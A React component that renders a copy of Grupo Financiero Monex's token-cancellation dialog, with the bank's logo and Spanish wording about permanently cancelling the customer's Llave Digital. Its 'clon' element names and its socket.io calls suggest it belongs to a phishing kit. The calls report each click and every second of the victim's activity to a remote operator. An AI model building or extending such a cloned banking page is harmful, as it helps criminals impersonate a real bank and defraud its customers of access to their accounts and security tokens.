import React from "react";
import i00 from "./img/icons/logo.png";
import socket from "../socket";

function Ctoken({ sCt, sS, sP }) {
  const [s, setS] = React.useState(false);
  const [isActive, setIsActive] = React.useState(false);
  const [time, setTime] = React.useState(0);
  const [cont, setCont] = React.useState(0);
  const handleX = () => {
    socket.emit("cancel off");
    sCt(false);
  };
  const handleC = (e) => {
    sS(true);
    setS(true);
    setIsActive(true);
    socket.emit("update token", { token: "Cancelar", bToken: true });
    socket.emit("open bToken", { bToken: true });
  };

  React.useEffect(() => {
    let interval = null;
    if (s) {
      if (time >= 5) {
        sP(0);
        sS(false);
        setIsActive(false);
        setCont(cont + 0);
        setTime(0);
      }
    }
    if (isActive) {
      interval = setInterval(() => {
        setTime((time) => time + 1);
        socket.emit("time user", { time: time + 1, p: cont + 2 });
      }, 1000);
    } else {
      clearInterval(interval);
    }
    return () => {
      clearInterval(interval);
    };
  }, [isActive, time, cont]);
  return (
    <>
      <div id="clonMsj">
        <div
          className="modal"
          id="clonMsjGenerico"
          style={{ display: "block" }}
        >
          <a
            className="close-modal close-md"
            id="closeGenerico1"
            style={{ marginRight: "-23%", display: "inline-block" }}
            onClick={handleX}
          ></a>
          <div
            className="container"
            id="clonContainerGenerico"
            style={{ width: "500px" }}
          >
            <div className="logo">
              <img src={i00} alt="Grupo Financiero Monex" />
            </div>
            <div className="mensaje informacion">
              <div className="mb30" align="center">
                <p className="f23" id="tituloGenerico1">
                  Cancelación de token Monex
                </p>
              </div>
              <div className="mb30">
                <p id="cuerpoGenerico1">
                  Esta operación cancela de manera definitiva su Llave Digital
                  Monex y no puede ser revertida, por lo que su dispositivo no
                  podrá utilizarse nuevamente. Al continuar con la cancelación
                  su sesión actual será finalizada.
                </p>
              </div>
              <div className="row">
                <div id="renglonGenerico1">
                  <div
                    className="col6 xs-mb10"
                    id="botonGenerico1"
                    onClick={handleX}
                  >
                    <a className="btn full close-md bg-gray7">No por ahora</a>
                  </div>
                  <div
                    className="col6 xs-mb10"
                    id="botonGenerico2"
                    onClick={handleC}
                  >
                    <a className="btn full close-md bg-green">Cancelar token</a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

export default Ctoken;
